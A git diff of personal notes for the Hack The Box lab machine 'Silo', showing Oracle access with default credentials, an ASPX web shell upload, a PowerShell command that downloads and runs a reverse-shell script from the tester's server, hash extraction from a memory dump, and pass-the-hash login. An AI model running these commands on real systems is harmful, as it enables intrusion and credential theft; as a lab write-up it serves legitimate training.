@@ -62,15 +62,15 @@ feroxbuster -u http://silo.htb -k
 [####################] - 2m     30000/30000   243/s   http://silo.htb/aspnet_Client/ 
 [####################] - 2m     30000/30000   239/s   http://silo.htb/aspnet_client/system_web/ 
 ```
-
+Nothing interesting.
 
 ## Check the website
 ![[Pasted image 20230220111919.png]]
 Win server?
-/aspnet_client,/system_web I could not access
+/aspnet_client,/system_web, I could not access
+Nothing interesting then?
 
-
-## SMB 445
+## SMB port 445 tcp
 
 ### smbclient
 ```
@@ -107,12 +107,10 @@ SMB         silo.htb        445    SILO             [*] Trying with SAMRPC proto
                 
 ```
 
-
-## oracle 1521
-
-## odat
-get service name
-
+We could not do anything with it.
+## Oracle port 1521 tcp
+### Odat
+get service name and we can potentially crack username and password.
 https://github.com/quentinhardy/odat
 
 normal
@@ -365,7 +363,8 @@ c
 SID:XE
 Username: scott
 Password:tiger
-## metasploit
+
+## Metasploit
 
 ```shell
 msf6 auxiliary(admin/oracle/sid_brute) > run
@@ -376,17 +375,18 @@ msf6 auxiliary(admin/oracle/sid_brute) > run
 [*] Auxiliary module execution completed
 ```
 
-## oracle pentesting
+I could not make it work.
+
+# Foothold
+## Oracle pentesting
 https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation
 
-
-or
 ```
 sudo apt install oracle-instantclient-sqlplus
 echo "/usr/lib/oracle/19.6/client64/lib/libsqlplus.so" >> /etc/ld.so.conf
 ```
 
-## login
+### Login to sqlplus
 ```
 sudo sqlplus scott/tiger@silo.htb/XE  
 ```
@@ -403,7 +403,9 @@ SCOTT                          CONNECT                        NO  YES NO
 SCOTT                          RESOURCE                       NO  YES NO
 ```
 
-## sysdba login?
+nothing so interesting?
+
+## Sysdba login
 ` sudo sqlplus scott/tiger@silo.htb/XE 'as sysdba'`
 
 ```
@@ -454,8 +456,9 @@ SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO
 32 rows selected.
 
 ```
+More Information
 
-## odat again
+### Odat again with more information
 ```
 odat all -s silo.htb -p 1521 -d XE -U scott -P tiger --sysdba
 [+] Checking if target 10.129.95.188:1521 is well configured for a connection...
@@ -539,10 +542,8 @@ c
 ```
 
 
-##
-https://github.com/quentinhardy/odat/blob/master-python3/pictures/odat_mind_map_v1.0.jpg
+### Upload text
 
-## upload text
 https://0xdf.gitlab.io/2018/08/04/htb-silo.html
 ```
 ┌──(kali㉿kali)-[~]
@@ -556,8 +557,9 @@ https://0xdf.gitlab.io/2018/08/04/htb-silo.html
 tofu was here
 ```
 
+now we know that we can upload shell.
 
-## upload web shell
+### Upload web shell
 https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
 
 ```
@@ -568,35 +570,30 @@ https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
 [+] The /home/kali/Documents/Tools/webshell.aspx local file was put in the remote C:\inetpub\wwwroot path (named webshell.aspx)
 ```
 
-## Access webshell
+### Access webshell
 ```
 http://silo.htb/webshell.aspx
 ```
 
 ![[Pasted image 20230220142906.png]]
 
-## revshell
+### Get revshell
 
 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.48 -Port 8084
 ```
-add it
+add this line at the end of the ps1 file.
 
 ```
 python3 -m http.server 8000
 ```
 
-Run it in webshell
+Run the following in webshell
 `powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')`
-
-```
-nc -lnvp 1234
-```
 
 ![[Pasted image 20230220143751.png]]
 
-## shell
 ```
 nc -lnvp 1234                                    
 listening on [any] 1234 ...
@@ -613,9 +610,7 @@ PS C:\windows\system32\inetsrv>
 ## User flag
 ```
 PS C:\Users\Phineas\Desktop> ls
-
-
-    Directory: C:\Users\Phineas\Desktop
+Directory: C:\Users\Phineas\Desktop
 
 
 Mode                LastWriteTime     Length Name                              
@@ -629,7 +624,7 @@ PS C:\Users\Phineas\Desktop> type user.txt
 ```
 
 # Privilege Escalation
-## oracle issue text
+## Oracle issue text in Desktop
 ```
 PS C:\Users\Phineas\Desktop> type 'Oracle issue.txt'
 Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):
@@ -643,24 +638,26 @@ link password:
 ?%Hm8646uC$
 ```
 
+The first letter is ? and it is supposed to be something else.
+
 ## Dropbox
 ![[Pasted image 20230220144106.png]]
 
-
+### Get oracle issue text in webshell
 ![[Pasted image 20230220144401.png]]
 
-`£%Hm8646uC$`
+Password: `£%Hm8646uC$`
 
+## Memory dump in dropbox
 ![[Pasted image 20230220144548.png]]
 
 
-## dumpfile
 ```
 file SILO-20180105-221806.dmp
 SILO-20180105-221806.dmp: MS Windows 64bit crash dump, full dump, 261996 pages
 ```
 
-## VT
+## Check VirusTotal
 
 ```
 md5sum SILO-20180105-221806.dmp
@@ -669,16 +666,14 @@ md5sum SILO-20180105-221806.dmp
 
 ![[Pasted image 20230220145454.png]]
 
+we could not find anything on VirusTotal, so this means that this file is probably unique to this machine.
 
-## volatility3
+## Volatility3
+We use volatility3 to analyze the dumpfile.
 ```
 git clone https://github.com/volatilityfoundation/volatility3.git
 ```
-
-```
-python3 vol.py -h
-```
-
+### windows.info
 ```
 python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.info
 Variable        Value
@@ -707,6 +702,8 @@ PE TimeDateStamp        Thu Aug 22 08:52:38 2013
 
 ```
 
+### hashdump
+I had a problem with hashdump due to a missing package.
 ```
 python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.hashdump.Hashdump -vvv
 Volatility 3 Framework 2.4.1
@@ -720,10 +717,12 @@ DEBUG    volatility3.framework: No module named 'Crypto'
 DEBUG    volatility3.framework: Failed to import module volatility3.plugins.windows.hashdump based on file: /home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins/windows/hashdump.py
 ```
 
+### Install the missing package
 ```
 pip install pycryptodome
 ```
 
+## Hash imfornation
 ```
 python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.hashdump.Hashdump     
 Volatility 3 Framework 2.4.1
@@ -735,7 +734,7 @@ Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7
 Phineas 1002    aad3b435b51404eeaad3b435b51404ee        8eacdd67b77749e65d3b3d5c110b0969
 ```
 
-## root
+## Root flag
 ```
 python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip silo.htb administrator@silo.htb
 Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra
@@ -754,6 +753,4 @@ C:\Windows\system32>
 
 ```
 
-
-## Flag
 under `/Users/Administrator/Desktop/root.txt`
